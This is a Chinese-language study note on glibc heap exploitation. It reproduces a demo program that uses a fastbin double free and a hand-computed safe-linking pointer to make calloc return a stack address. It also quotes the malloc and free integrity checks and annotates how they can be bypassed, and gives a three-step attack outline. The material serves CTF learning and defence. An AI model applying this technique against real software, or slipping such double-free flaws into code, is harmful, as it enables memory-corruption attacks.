# 源码
```
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
    fprintf(stderr, "This file extends on fastbin_dup.c by tricking calloc into\n"
           "returning a pointer to a controlled location (in this case, the stack).\n");

  
    fprintf(stderr,"Fill up tcache first.\n");

    void *ptrs[7];

    for (int i=0; i<7; i++) {
        ptrs[i] = malloc(8);
    }

    for (int i=0; i<7; i++) {
        free(ptrs[i]);
    }

/*这里是gcc的编译器指令，要求为该数组申请一个0x10对齐的地址*/
    unsigned long stack_var[4] __attribute__ ((aligned (0x10)));

    fprintf(stderr, "The address we want calloc() to return is %p.\n", stack_var + 2);

    fprintf(stderr, "Allocating 3 buffers.\n");

    int *a = calloc(1,8);
    int *b = calloc(1,8);
    int *c = calloc(1,8);

    fprintf(stderr, "1st calloc(1,8): %p\n", a);
    fprintf(stderr, "2nd calloc(1,8): %p\n", b);
    fprintf(stderr, "3rd calloc(1,8): %p\n", c);

    fprintf(stderr, "Freeing the first one...\n"); //First call to free will add a reference to the fastbin
    free(a);

    fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);

    fprintf(stderr, "So, instead, we'll free %p.\n", b);
    free(b);

    //Calling free(a) twice renders the program vulnerable to Double Free

    fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
    free(a);

    fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
        "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
    unsigned long *d = calloc(1,8);

    fprintf(stderr, "1st calloc(1,8): %p\n", d);
    fprintf(stderr, "2nd calloc(1,8): %p\n", calloc(1,8));
    fprintf(stderr, "Now the free list has [ %p ].\n", a);
    fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
        "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
        "so that calloc will think there is a free chunk there and agree to\n"
        "return a pointer to it.\n", a);
        
    stack_var[1] = 0x20;

    fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
    fprintf(stderr, "Notice that the stored value is not a pointer but a poisoned value because of the safe linking mechanism.\n");
    fprintf(stderr, "^ Reference: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\n");
    
    unsigned long ptr = (unsigned long)stack_var;
    unsigned long addr = (unsigned long) d;
    
    /*VULNERABILITY*/
    
    *d = (addr >> 12) ^ ptr;
    
    /*VULNERABILITY*/

    fprintf(stderr, "3rd calloc(1,8): %p, putting the stack address on the free list\n", calloc(1,8));

    void *p = calloc(1,8);

    fprintf(stderr, "4th calloc(1,8): %p\n", p);
    assert((unsigned long)p == (unsigned long)stack_var + 0x10);
}
```
这个利用，是对fastbin_dup（double free）的利用演示，这个样例里，会用double free修改一个location，这里为stack上一个叫stack_var的数组，实际做题中其实很难泄露stack地址，所以很少覆盖这里。

由于这部分并不复杂，也没有需要调试的地方，只对源码和攻击流程做个总结。
# 关于fastbin的检查机制
## malloc
下面会总结关于fastbin的几个检查，及部分绕过方式（很多都是旧技术，并不实用）。
```
static void *
_int_malloc (mstate av, size_t bytes)
{
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp;
      victim = *fb;

      if (victim != NULL)
	{
	  if (__glibc_unlikely (misaligned_chunk (victim)))
	    malloc_printerr ("malloc(): unaligned fastbin chunk detected 2");
	/*对fd指针指向地址的对齐检测*/
	  if (SINGLE_THREAD_P)
	    *fb = REVEAL_PTR (victim->fd);
	  else
	    REMOVE_FB (fb, pp, victim);
	  if (__glibc_likely (victim != NULL))
	    {
	      size_t victim_idx = fastbin_index (chunksize (victim));
	      if (__builtin_expect (victim_idx != idx, 0))
		malloc_printerr ("malloc(): memory corruption (fast)");
		/*对chunk结构的size处大小与索引大小的对比检测*/
	      check_remalloced_chunk (av, victim, nb);
	      /*只有debug时才开启，正常不会被编译*/
#if USE_TCACHE
	......
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      /*重要数据混淆覆盖，非debug不会被编译*/
	      return p;
	    }
	}
}
```
malloc要绕过的检查为以下两个：
1. 对fd指针指向地址的对齐检测。
2. 对chunk结构的size处大小与索引大小的对比检测。
## free
```
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
	......

  /* Little security check which won't hurt performance: the
     allocator never wrapps around at the end of the address space.
     Therefore we can exclude some size values which might appear
     here by accident or by "design" from some intruder.  */
  if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
      || __builtin_expect (misaligned_chunk (p), 0))
    malloc_printerr ("free(): invalid pointer");
  /* We know that each chunk is at least MINSIZE bytes in size or a
     multiple of MALLOC_ALIGNMENT.  */
  if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
    malloc_printerr ("free(): invalid size");
/*
对size的检查，不能太大，防止循环覆盖，不能太小，防止未知地址申请。
检查size是否0x10对齐。
*/

  check_inuse_chunk(av, p);

#if USE_TCACHE
  {
	......
#endif

  /*
    If eligible, place chunk on a fastbin so it can be found
    and used quickly in malloc.
  */

  if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
      /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
      */
      && (chunk_at_offset(p, size) != av->top)
#endif
      ) {

    if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))
			  <= CHUNK_HDR_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
      {
	bool fail = true;
	/* We might not have a lock at this point and concurrent modifications
	   of system_mem might result in a false positive.  Redo the test after
	   getting the lock.  */
	if (!have_lock)
	  {
	    __libc_lock_lock (av->mutex);
	    fail = (chunksize_nomask (chunk_at_offset (p, size)) <= CHUNK_HDR_SZ
		    || chunksize (chunk_at_offset (p, size)) >= av->system_mem);
	    __libc_lock_unlock (av->mutex);
	  }

	if (fail)
	  malloc_printerr ("free(): invalid next size (fast)");
	  /*也是对size大小的检测，size不比0x10小，不比从系统申请的总内存大。*/
      }

    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);

    atomic_store_relaxed (&av->have_fastchunks, true);
    unsigned int idx = fastbin_index(size);
    fb = &fastbin (av, idx);

    /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
    mchunkptr old = *fb, old2;

    if (SINGLE_THREAD_P)
      {
	/* Check that the top of the bin is not the record we are going to
	   add (i.e., double free).  */
	if (__builtin_expect (old == p, 0))
	  malloc_printerr ("double free or corruption (fasttop)");、
	  /*对doubel free的检测，这里只检测old的指向与当前是否相同。*/
	p->fd = PROTECT_PTR (&p->fd, old);
	*fb = p;
	......
      }
```
free部分有如下检测：
1. `0x10<size<申请的总大小·
2. 对doubel free的检测，这里只检测old的指向与当前是否相同。

# 攻击流程
这个样例其实是对fastbin_dup的实际应用，主要为以下几步：
1. doubel free进行任意地址申请。
2. 伪造chunk，保证通过以上检测。
3. 算好偏移进行覆盖。